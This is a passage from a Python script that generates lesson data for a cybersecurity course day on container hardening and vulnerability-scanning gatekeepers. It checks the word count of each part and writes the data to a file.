        "Implemented automated vulnerability scanning pipelines evaluating Software Bill of Materials (SBOM / CycloneDX) with Trivy and Grype using CVSS and EPSS risk scoring.",
        "Deployed an enterprise production container policy gatekeeper certifying 100% compliance across non-root execution, immutable storage, clean vulnerability scans, and signed provenance."
    ],
    "projectStep": {
        "title": "Project Step 47: Enterprise Container Security Hardening & CI/CD Vulnerability Gatekeeper",
        "steps": [
            "Construct a Docker daemon configuration auditor verifying inter-container isolation and user namespace remapping.",
            "Implement a container image inspector verifying Distroless base image characteristics and non-root execution.",
            "Deploy an automated vulnerability policy gatekeeper scanning SBOM inventories and certifying production container deployment artifacts."
        ]
    }
}

total_words = 0
for p in day47_data["parts"]:
    wc = sum(len(x.split()) for x in p["say"])
    print(f"Cyber Day 47 Part {p['part']} Word Count: {wc}")
    assert wc >= 600, f"Part {p['part']} word count {wc} below 600 words!"
    total_words += wc

print(f"Total Cyber Day 47 Words: {total_words}")

with open("scripts/cyber_day47_data.py", "w", encoding="utf-8") as f:
    f.write("# Cyber Day 47 Data\nDAY_47_DATA = " + repr(day47_data) + "\n")

print("Generated scripts/cyber_day47_data.py successfully!")
